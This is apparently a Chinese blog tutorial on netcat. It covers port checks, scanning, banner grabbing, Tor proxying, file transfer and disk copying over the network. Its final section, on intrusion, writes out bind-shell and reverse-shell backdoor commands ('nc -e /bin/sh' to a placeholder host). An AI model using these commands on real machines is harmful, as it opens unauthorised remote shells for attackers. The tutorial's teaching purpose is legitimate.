---

title: netcat使用教程
tags:
  - Linux
  - shell
  - netcat
  - 信息安全
  - 网络
categories:
  - 信息安全
  - 教程
date: 2019-09-21

---

## netcat使用教程

@author linjinbao666@gmail.com [fork me on github](https://github.com/linjinbao666)

## netcat简介

netcat 一般简称为 nc，直译为中文就是“网猫”，被誉为——【**网络上的瑞士军刀**】。它诞生于1995年，在网络安全社区的名气很大（就如同 AK47 在军事领域的名气）。长期在安全圈内混的人，应该都知道它。想当年，insecure.org 网站在本世纪初搞过几次“年度投票”，评选优秀的安全工具。每次投票，netcat 都能排进前几名。[参考链接](https://en.wikipedia.org/wiki/Netcat)

## nc命令行简介

形式： **nc 命令选项 主机 端口** 命令选项 这部分可能包含 0~N 个选项 （注：这部分最复杂，下一个小节单独聊） 主机 这部分可能没有，可能以“点分十进制”形式表示，也可能以“域名”形式表示。 端口 这部分可能没有，可能是单个端口，可能是端口范围（以减号分隔）
举例：

```text
nc -l -p 12345 -v
```

在这个例子中，分别用到了三个选项（l、v、p），其中 12345 是选项 p 所带的【选项值】

## 常用的命令行选项

| 选项 | 是否有选项值 | 说明 |
| :--- | :--- | ---: |
| h | NO | 输出 nc 的帮助 |
| v | NO | 在网络通讯时，显示详细的输出信息 |
注：建议新手多用该选项，出错时帮你诊断问题\| \| n\| No\| 对命令行中的“主机”，【不】进行域名解析 \| \| p \| YES \| 指定“端口号” \|
命令行合写形式：

```text
nc -lp 12345 -v
nc -l -v -p 12345
nc -lv -p 12345
nc -lvp 12345
```

## 使用场景一：（网络诊断）测试某个远程主机的【监听】端口是否可达

```text
nc -nv x.x.x.x xx
```

```text
[root@localhost netcat]# netcat -nv 172.19.66.61 8080
172.19.66.61 8080 (webcache) open
^CExiting.
[root@localhost netcat]# netcat -nv 172.19.66.61 22
172.19.66.61 22 (ssh) open
SSH-2.0-OpenSSH_6.6.1
^CExiting.
[root@localhost netcat]# 80/epoint-web-zwdt
```

## 使用场景二：（网络诊断）判断防火墙是否“允许 or 禁止”某个端口

```text
nc -lv -p 8080
```

```text
[root@jk-zhengwu01 ~]# nc -lv -p 8080
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: bind to :::8080: Address already in use. QUITTING.
[root@jk-zhengwu01 ~]# clear
[root@jk-zhengwu01 ~]# nc -lv -p 8090
Ncat: Version 7.50 ( https://nmap.org/ncat )
Ncat: Listening on :::8090
Ncat: Listening on 0.0.0.0:8090
Ncat: Connection from 192.168.30.40.
Ncat: Connection from 192.168.30.40:64216.
GET / HTTP/1.1
Host: 172.19.66.60:8090
Connection: keep-alive
DNT: 1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.75 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7
Cookie: epoint_local=zh_CN; _theme_=dream; isnormal=1; e596eeb6-5835-4f37-b53c-c56492c4ae16=; f893945b-d030-4007-af87-b7692d468c37=; m=2258:Z3Vlc3Q6Z3Vlc3Q%253D; areacode=110118

[root@jk-zhengwu01 ~]#
```

## 使用场景三：（渗透测试）用 nc 玩“端口扫描”

```text
netcat -znv x.x.x.x 1-1024
netcat -znv x.x.x.x 1-1024  2>&1 | grep succeeded
```

```text
[root@localhost ~]# nc -nv -w 1 -z 172.19.66.61 1-100
172.19.66.61 22 (ssh) open
^CExiting.
[root@localhost ~]# nc -nv -w 1 -z 172.19.66.61 8080
172.19.66.61 8080 (webcache) open
[root@localhost ~]# nc -nv -w 1 -z 172.19.66.61 22 8080
172.19.66.61 22 (ssh) open
172.19.66.61 8080 (webcache) open
[root@localhost ~]#
```

## 使用场景四：（隐匿性）如何让 nc 走暗网（以 Tor 为例）

```text
netcat -X 5 -x 127.0.0.1:1080 -v 172.19.66.61 8080
PS：netcat版本不够，不便测试
```

## 使用场景五：（信息收集）用 nc 探测“服务器类型”和“软件版本”（以 SSH 为例）

```text
echo "EXIT" | nc-tor -vq 5 -n 服务器IP 22
```

```text
[root@localhost ~]# echo "EXIT" | netcat -v ssh.github.com 22
ssh.github.com [192.30.253.122] 22 (ssh) open
SSH-2.0-babeld-dae25663
[root@localhost ~]#
```

## 使用场景六：（系统管理）用 nc 传输文件

```text
接收端：
nc -l -p xxx > file2
发送端：
nc x.x.x.x xxx < file1
```

## 使用场景七：（系统管理）用 nc 远程备份整个磁盘

```text
接收端：
nc -l -p xxx | dd of=/dev/sdb
发送端：
dd if=/dev/sda | nc x.x.x.x xxx
```

## 使用场景八：（入侵手法）用 nc 开启连接型后门

1.被动型

```text
被攻击对象：
nc.exe -l -p xxx -e cmd.exe
nc -l -p xxx -e /bin/sh
```

2.主动型

```text
被攻击对象
nc.exe -e cmd.exe x.x.x.x xxx
nc -e /bin/sh x.x.x.x xxx
```

后门创建好之后，攻击者在自己机器上也运行 nc（客户端 nc），然后连接到作为后门的 nc（服务端 nc）。一旦连上之后，攻击者就可以在自己的 nc 上看到对方（受害者机器）的 shell 提示符。
